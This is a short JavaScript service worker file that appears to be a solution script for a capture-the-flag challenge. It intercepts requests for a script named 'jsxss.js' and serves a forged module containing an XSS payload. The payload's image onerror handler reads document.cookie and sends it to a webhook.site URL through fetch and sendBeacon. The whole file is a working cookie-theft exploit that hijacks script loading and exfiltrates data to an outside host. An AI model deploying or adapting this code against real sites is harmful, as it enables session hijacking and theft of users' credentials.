self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
  const url = event.request.url;
  if (url.includes('jsxss.js') || url.includes('3000')) {
    // This function runs during Stage 2 on your origin.
    // It returns the raw HTML string that will be written to extension storage 'previous'.
    const fakeModule = `
      export default function(input) {
        return '<img src="x" onerror="var c=encodeURIComponent(document.cookie);fetch(\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=\\'+c);if(navigator.sendBeacon)navigator.sendBeacon(\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=\\'+c);">';
      }
    `;
    event.respondWith(
      new Response(fakeModule, {
        headers: { 
          'Content-Type': 'application/javascript',
          'Access-Control-Allow-Origin': '*'
        }
      })
    );
  }
});